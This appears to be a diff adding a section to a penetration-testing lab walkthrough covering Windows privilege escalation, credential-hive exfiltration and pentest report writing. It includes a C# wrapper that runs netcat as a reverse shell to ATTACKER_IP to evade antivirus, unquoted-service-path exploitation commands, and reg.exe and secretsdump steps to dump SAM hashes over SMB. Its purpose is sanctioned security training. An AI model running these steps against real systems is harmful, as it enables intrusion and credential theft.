@@ -2160,3 +2160,335 @@ We have full control over this directory! How strange, but hey, Thomas' security
 This means that we can create our unquoted service path exploit, but we could also perform attacks such as DLL hijacking, or even outright replacing the service executable with a malicious binary.
 
 That said, we will stick to the unquoted service path vulnerability purely to avoid messing with the service itself. This way all we need to do is create our own binary then delete it, rather than alter any of the files in the service itself.
+
+## Privilege Escalation
+
+Let's recap what we found in the previous task:
+
+- We have a privilege which we could almost certainly use to escalate to system permissions. The downside is that we'd need to obfuscate the exploits in order to get them past Defender.
+- We have an unquoted service path vulnerability for a service running as the system account. This is ideal.
+- 
+We have everything we need to root this box. Let's do this!
+
+Of the two vulnerabilities that are immediately available, we will work through the unquoted service path attack for one simple reason: getting a reverse shell back from this is very easy -- even with Defender in play. The exploits available to manipulate the privilege we found would need to be custom compiled and obfuscated in order to be useful to us; however, with the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we already have on the target. To put it another way, we just need to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system). Ideally we would write a full C# service file that would integrate seamlessly with the Windows service management system. Whilst this is perfectly possible (and is by far the preferable option), for the sake of simplicity, we will stick to just creating a standalone executable. It's worth noting that this technique is effective at bypassing the antivirus software on the target; however, in an enterprise situation there is a good chance that it would be picked up by an intrusion detection system. In this scenario we would be looking for a more sophisticated (if similar) solution.
+
+Ideally we'd be using Visual Studio here. If you happen to have a Windows host and are familiar with Visual Studio then please feel free to use it for. As not everyone has access to a Windows machine (or is comfortable installing Windows as a virtual machine), the teaching content will work with the mono dotnet core compiler for Linux. This can be easily installed on Kali and will allow us to compile C# executables that can be run on Windows targets. The same code will work just fine if compiled in Visual Studio, however.
+First we need to install Mono. This can be done with:
+```
+
+sudo apt install mono-devel
+
+```
+If you are using the AttackBox then this should already be installed.
+
+Now, open a file called Wrapper.cs in your favourite text editor.
+
+The first thing we need to do is add our "imports". These allow us to use pre-defined code from other "namespaces" -- essentially giving us access to some basic functions (e.g. input/output). At the very top if the file, add the following lines:
+
+```
+using System;
+using System.Diagnostics;
+```
+
+These allow us to start new processes (i.e. execute netcat).
+
+Next we need to initialise a namespace and class for the program:
+```
+namespace Wrapper{
+    class Program{
+        static void Main(){
+            //Our code will go here!
+        }
+    }
+}
+
+```
+
+We can now write the code that will call netcat. This goes inside the Main() function (replacing the //Our code will go here! line).
+
+First, we create a new process, as well as a ProcessStartInfo object to set the parameters for the process:
+
+```
+Process proc = new Process();
+ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");
+```
+
+Make sure to replace the nc-USERNAME.exewith the name of your own netcat executable, as well as slotting in your own IP and Port!
+
+With the objects created, we can now configure the process to not create it's own GUI Window when starting
+```
+procInfo.CreateNoWindow = true;
+```
+Finally, we attach the ProcessStartInfo object to the process, and start the process!
+```
+proc.StartInfo = procInfo;
+proc.Start();
+```
+Our program is now complete. It should look something like this:
+
+![image](https://user-images.githubusercontent.com/89842187/132127318-a9c9556f-17a1-4435-9411-80567afaf84d.png)
+
+We can now compile our program using the Mono mcs compiler. This is extremely simple using the package we installed earlier:
+mcs Wrapper.cs
+
+![image](https://user-images.githubusercontent.com/89842187/132127320-33e3b640-27da-4d18-99b0-1c75303872ec.png)
+
+
+Transfer the Wrapper.exe  file to the target. Just to spice things up a bit, let's use an Impacket SMB server, rather than our usual HTTP server. If you would prefer to use the HTTP server and cURL (or another method to transfer the file) you are welcome to do so.
+
+Impacket is a Python library that makes it very easy to interact with a wide variety of Windows services from Linux.
+
+First up, let's download the package:
+```
+sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket && cd /opt/impacket && sudo pip3 install .
+
+```
+
+Note: On the AttackBox Impacket is preinstalled at /opt/impacket/impacket
+
+We can now start up a temporary SMB server:
+
+```
+sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
+
+```
+![image](https://user-images.githubusercontent.com/89842187/132127352-835afdd5-2cca-4d66-bbdb-c6c9dc41ebd3.png)
+
+With this command we created a server on our IP, serving a share called "share" in the current directory. As Impacket uses SMBv1 by default, we need to specify that is use SMBv2 in order for the relatively up-to-date target to accept it. We then set a username and password for connections to the server -- again, this is due to security policies on the target requiring connections to be authenticated.
+
+Now, in our reverse shell, we can use this command to authenticate:
+
+```
+net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
+
+```
+
+![image](https://user-images.githubusercontent.com/89842187/132127360-05c63e5e-6ed4-4357-a0bf-f25091112493.png)
+
+This authenticates with the server using the credentials we set (user:s3cureP@ssword). We can now copy our compiled  Wrapper.exe program up to the target. Due to file permissions on the normal C:\Windows\Temp directory, we are doing this from our current user's own %TEMP% directory:
+
+```
+copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
+```
+
+![image](https://user-images.githubusercontent.com/89842187/132127371-71858e5e-4099-44d7-838c-a24f1ff751b4.png)
+
+
+Note: We could have just executed this directly through the share -- exactly as we did with Mimikatz when dealing with the Gitserver. We are copying it here purely because we will need to have a copy on the target sooner or later anyway.
+
+It is often useful to just leave an SMB server running in the background when working with Windows targets. We will use this server later, so let's leave it up for now.
+
+That said, to prevent errors down the line, we should disconnect from it for the time being:
+
+```
+net use \\ATTACKER_IP\share /del
+
+```
+
+![image](https://user-images.githubusercontent.com/89842187/132127384-ef9f5241-4f5e-4a69-8b86-b55b7a715cb8.png)
+
+
+Start a listener on your chosen port and try to execute the wrapper manually -- you should get a reverse shell back:
+```
+"%TEMP%\wrapper-USERNAME.exe"
+```
+
+![image](https://user-images.githubusercontent.com/89842187/132127389-9c7cb1e0-eec8-44e3-b41f-992b5f603059.png)
+
+Excellent. Our program works and is not getting caught by the antivirus. We are now ready to exploit that unquoted service path vulnerability!
+
+Unquoted service path vulnerabilities occur due to a very interesting aspect of how Windows looks for files. If a path in Windows contains spaces and is not surrounded by quotes (e.g. C:\Directory One\Directory Two\Executable.exe) then Windows will look for the executable in the following order:
+
+
+- C:\Directory.exe
+- C:\Directory One\Directory.exe
+- C:\Directory One\Directory Two\Executable.exe
+
+What this means is that if we can create a file called Directory.exe in the root directory, or C:\Directory One\, then we can trick Windows into executing our file instead!
+
+Let's take a look at the actual path of our vulnerable service: C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe. There are technically three places we could add our program here:
+
+- We could put it in the root directory and call it Program.exe. This is very unlikely to work, as the chances of having write permissions here are virtually 0.
+- We could put it in the C:\Program Files (x86)\ directory and call it System.exe. Once again, this is unlikely to work because the chances of being able to write into C:\Program Files (x86)\ are minimal.
+- We could put it in C:\Program Files (x86)\System Explorer\ and call it System.exe. This one will work! Remember we checked the permissions of this directory in the last task and found that we had full access? This means that we can place our wrapper into this directory, then when the service is restarted, our wrapper will be executed giving us a shell as the local system user!
+
+Before blindly copying your wrapper, check to make sure that another user isn't currently performing this exploit:
+```
+dir "C:\Program Files (x86)\System Explorer\"
+```
+If you see a file called System.exe in the output then please wait a few minutes until it disappears.
+
+If there is not already an exploit in the directory then it's time to root this thing!
+
+Copy your wrapper from C:\Windows\Temp\wrapper-USERNAME.exe to C:\Program Files (x86)\System Explorer\System.exe.
+copy %TEMP%\wrapper-USERNAME.exe "C:\Program Files (x86)\System Explorer\System.exe"
+
+![image](https://user-images.githubusercontent.com/89842187/132127415-3e34d06f-03d1-4225-b005-4fc92a3759dd.png)
+
+Note: There is a cleanup script running on this target once every five minutes in case any hackers are too sloppy to cover up their tracks by restoring the service to working order. If your payload disappears before execution then you may have been caught by the script. If this happens, just repeat this step and the exploit should work.
+
+Our exploit is in place! We have two options to activate it:
+
+- This service starts automatically at boot, so we could try restarting the entire box (although we don't actually have the required permissions to do this to prevent users from taking the box down).
+
+- We could try restarting the service itself. Given the amount of access to this service that Thomas has given to his account, it's a fair bet that we might be able to do this.
+
+Failing either of these, we would be stuck waiting for someone to restart the target for us naturally.
+
+Let's try stopping the service:
+
+```
+sc stop SystemExplorerHelpService
+
+```
+
+![image](https://user-images.githubusercontent.com/89842187/132127753-b5c76c55-356a-456a-9fd6-f3ae3da6c674.png)
+
+![image](https://user-images.githubusercontent.com/89842187/132127756-95fcffdd-7882-4ded-bd58-f9a56fa8ebb1.png)
+
+We have root!
+
+Notice that we got a message telling us that the service failed to start. This is because the wrapper we uploaded isn't actually a real Windows service file. Our executable still gets executed, but as far as Windows is concerned, the service failed to start.
+
+There's only one thing left to do here.
+
+Let's clear up after ourselves by deleting the wrapper and starting the service:
+
+```
+del "C:\Program Files (x86)\System Explorer\System.exe"
+sc start SystemExplorerHelpService
+```
+
+![image](https://user-images.githubusercontent.com/89842187/132127763-e277207c-547d-4ba4-8610-d4885a407673.png)
+
+
+There's only one thing left to do here.
+
+Let's clear up after ourselves by deleting the wrapper and starting the service:
+del "C:\Program Files (x86)\System Explorer\System.exe"
+sc start SystemExplorerHelpService
+Demonstration of the correct output from deleting the binary and starting the service normally
+
+Clearing up after exploits is a good habit to get into. This also has the added bonus of being courteous to other users in the box who may be about to perform the exploit. Note that deleting the wrapper and restarting the service did not destroy the system shell!
+
+Bonus Question (optional): Research how to write a real Windows Service executable in C# and try to create a wrapper (or even a full reverse shell!) that doesn't cause the sc start command to error out.
+
+The code here may help (but please do not run this as-is because it will create a new user with a known password):
+
+## Exfiltration Techniques & Post Exploitation
+
+Data exfiltration is something that should never be considered without explicit prior consent. Generally speaking, most external engagements will strongly prohibit taking data from compromised systems; however, it is worth bearing in mind that this may not be the case for internal engagements -- and some external engagements outright set targets for the red team that revolve around exfiltrating a set piece of data from the targets once compromised. Even if this is a skill that may not be used on a daily basis, it is still well worth learning.
+
+The goal of exfiltration is always to remove data from a compromised target. This could be things like passwords, keys, customer/employee data, or anything else of use or value. If the data being exfiltrated is in plain text then this could be as simple as copying and pasting the contents of a file from a remote shell into a local file. If the data is in a binary format, or otherwise can't just be copied and pasted, then more complicated methods must be used to exfiltrate the targeted file.
+
+A common method for exfiltrating data is to smuggle it out within a harmless protocol, usually encoded. For example, DNS is often used to (relatively) quietly exfiltrate data. HTTPS tends to be a good option as the data will outright be encrypted before egress takes place. ICMP can be used to (very slowly) get the data out of the network. DNS-over-HTTPS is superb for data exfiltration, and even email is often used.
+
+In a real world situation an attacker will be looking to exfiltrate data as quietly as possible as there may be an Intrusion Detection System active on the compromised network which would alert the network administrators to a breach should the data be detected. For this reason an attacker is unlikely to use protocols as simple as FTP, TFTP, SMB or HTTP; however, in an unmonitored network these are still good options for moving files around.
+
+It's worth noting that most command and control (C2) frameworks come with options to quietly exfiltrate data. Practically speaking, this is likely how a bad actor would be exfiltrating data, so it's worth keeping up to date with the current "standards" used by the various frameworks. There are also plenty of standalone tools available to automate sending and receiving obfuscated data.
+
+In short, the only limitation when it comes to exfiltration is your imagination. Whilst there are certainly common techniques available (and many tools around to take advantage of them) it will always be the new and obscure methods that are the most successful. Who knows? Maybe you'll even find a legitimate use for steganography!
+
+As extra reading, PentestPartnershttps://www.pentestpartners.com/ have a superb blog post https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/ on this topic.
+
+
+Let's put this into practice!
+
+We need some way to prove to Thomas that we've compromised his PC. We could leave a note on his Desktop, or we could be fancy and give him his Administrator password hash to prove that we've rooted it.
+
+There's no way we're going to get Mimikatz past Defender. We have SYSTEM access, so we could technically just disable Defender, but let's try to do this with as little destructiveness as possible (not least for other users on the network). What we can do is grab the files containing the password hashes, pass them back to our attacking machine, then dump the hashes locally. On Linux this would be a simple matter of grabbing /etc/shadow. On Windows it is slightly more complex than that.
+
+Local user hashes are stored in the Windows Registry whilst the computer is running -- specically in the HKEY_LOCAL_MACHINE\SAM hive. This can also be found as a file at C:\Windows\System32\Config\SAM, however, this should not be readable whilst the computer is running. To dump the hashes locally, we first need to save the SAM hive:
+```
+reg.exe save HKLM\SAM sam.bak
+```
+This saves the hive as a file called "sam.bak" in the current directory.
+
+Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:
+
+```
+reg.exe save HKLM\SYSTEM system.bak
+```
+With both Hives dumped, we can exfiltrate them back to our attacking machine to dump the hashes out of sight of Defender.
+
+It's up to you how you choose to exfiltrate the files. Given this is a home network with no monitoring in place, an SMB server is recommended. Connect to your SMB server using your SYSTEM reverse shell with the net use command. You can now either save the files directly to your own drive, or move the files to your attacking machine if you already dumped the hives, e.g:
+```
+reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak
+```
+or
+
+```
+move sam.bak \\ATTACKING_IP\share\sam.bak
+```
+Note: You may encounter an error when reconnecting. This is due to the way that Windows handles cached credentials:
+
+![image](https://user-images.githubusercontent.com/89842187/132127831-1bb9a220-5cc8-455a-86c1-0f803b1f98f9.png)
+
+System error 1312 can usually be solved by connecting using an arbitrary domain. For example, specifying /USER:domain\user. rather than just the username. The same SMB server will still work here; however, Windows sees it as a different user account and thus allows the new connection.
+
+With both files stored locally, we can now dump some hashes! Make sure you delete the .bak files from the target if you copied them rather than moving them.
+
+Once again, remember to disconnect from the SMB server!
+
+
+There are a variety of tools that could do this job for us. The most reliable is (as is often the case), a script from the Impacket library: secretsdump.py
+
+Let's use this against our dumped hives:
+
+```
+python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL
+
+
+```
+![image](https://user-images.githubusercontent.com/89842187/132127853-0b075885-0035-4486-9d1e-f8e2e254d062.png)
+
+Each local account on the target is shown here, in a format of Username, RID, LM hash, NT hash -- separated by colons. We are interested in the NT hashes -- the last section (blurred). As a side note: 31d6cfe0d16ae931b73c59d7e0c089c0 is an empty hash, and indicates that the account is not activated. These can thus be discounted.
+
+## Debrief & Report
+
+We started this assignment with three targets. One Linux, two Windows.
+
+All three have now been fully compromised -- well done!
+
+Hopefully you've been taking notes and are now about to start writing a report on the topic. If you're not familiar with pentest reports, the following task may come in handy. Additionally, Offensive Security have also published an example penetration test report here, and there is a whole community-curated repository of public reports here should you need more inspiration.
+https://github.com/juliocesarfort/public-pentesting-reports
+
+
+Penetration test reports are generally split into several sections. There is no strictly defined standard unfortunately, but the following layout should be well received:
+
+F- irst up is the Executive Summary. This should be essentially non-technical, providing a brief overview of the job that was contracted to (and completed by) the pentester, including a concise summary of the scope of the engagement. You should also include a very short summary of the results here, as well as a concise analysis of the overall security posture of the company. Be aware thought that, as the name suggests, this section is designed to be read by the higher-ups in a company who may not have a technical background or the time to devote to a long-winded explanation. This section is particularly important as in many cases it may be the only section that the client actually looks at. It should catch the eye, and will set the tone for the rest of the report.
+- At the end of (or immediately after) the executive summary include a Timeline showing an overview of what you did and when you did it. This allows whoever is assigned to fix the vulnerabilities to check any logs from the compromised system and see what a successful attack looks like from their own privileged perspective.
+- Next we have the Findings and Remediations section. This should be a more technical section. It should provide a detailed explanation of the vulnerabilities you found as well as your suggested fixes for these. Additionally, you should indicate the severity of each vulnerability, and the risk to the company should the vulnerability be exploited by a bad actor -- the CVSS calculator will be useful for this. You should not necessarily be providing a step-by-step account of your methodology here, but there should be enough detail for a technically-able person to see what the problem is, and what the solutions might be.
+- After the findings and remediations should come the Attack Narrative. This should be a step-by-step writeup of the actions you took against the targets, including enough detail for a technically-competent individual to replicate the attacks exactly in an almost copy-and-paste approach. In many ways this is similar to a detailed write-up for a CTF.
+- A section that is good to include but often skipped: the Cleanup section. This should detail the actions you took to eradicate your presence on the targets (e.g. removing any added accounts, deleting exploits or created files, etc).
+- Next (but not last), there should be a Conclusion. This just summarises the report, rounding off the results and stressing the importance of patching as required.
+- Finally you should include References then Appendices. The references section includes full references to any works cited throughout the report (for example, maybe a quote or table from the OWASP website, or referencing a newspaper article on an attack which utilised a vulnerability found in the target network). The references section should also be used to link to relevant CVEs (Common Vulnerability and Exposure), CWEs (Common Weakness Enumerations), and/or CAPECs (Common Attack Pattern Enumerations and Classifications) for the found vulnerabilities. Your appendices should include any large pieces of information that would have cluttered up the main text. For example, if you had to edit an exploit (as we did during the Wreath network), you should include a full copy of the edited code as an appendix and reference it when mentioned in the other sections. Equally, any code you write should also be stored here (with the exception of short snippets and one-liners, which can be placed inline at the relevant section), along with any large amounts of data or big tables / diagrams.
+
+
+So, the sections should be:
+
+- Executive Summary
+- Timeline
+- Findings and Remediations
+- Attack Narrative
+- Cleanup
+- Conclusion
+- References
+- Appendices
+
+Pentest reports will usually also have a branded front-cover and a table of contents before the report itself begins.
+
+There are many pentest report templates available on the Internet which can be used to provide a baseline for this. Many companies will also provide their penetration testers with a company-specific template to follow. Regardless, of whether you use a pre-built template or create your own, find a style and stick with it!
+
+With your report written and proof-read, you send the PDF to Thomas then sit back and relax, your work is done!
+
+
+If you write a report you are welcome to keep it for your own records, or submit it to the room as a writeup for others to read!
+
+In the real-world, a section of the pre-engagement meetings between the client and the pentesting company would set out expectations for report handling procedures. This would cover things like the delivery method for the report (i.e. how will it be transferred securely between the consultants and the clients), as well as how (and when) consultant copies of the report should be disposed of. Clients obviously do not want a report detailing their technical vulnerabilities falling into the wrong hands, so this section is very important.
+
+important!
+
+Consider the following brief to be the "report-handling procedures" for this assignment:
+
+Reports should be written in English and submitted as PDFs hosted on Github, Google Drive or somewhere else on the internet to be viewed in the browser with no downloads required. Reports should not contain answers to questions, as far as is possible (i.e. host names are fine, passwords or password hashes are not). As you are being encouraged to write these in the format of a penetration test report, writeups submitted in other formats will not be accepted to the room. If you want to do a video walkthrough of the network then this can be linked to at the end of an otherwise complete PDF report.
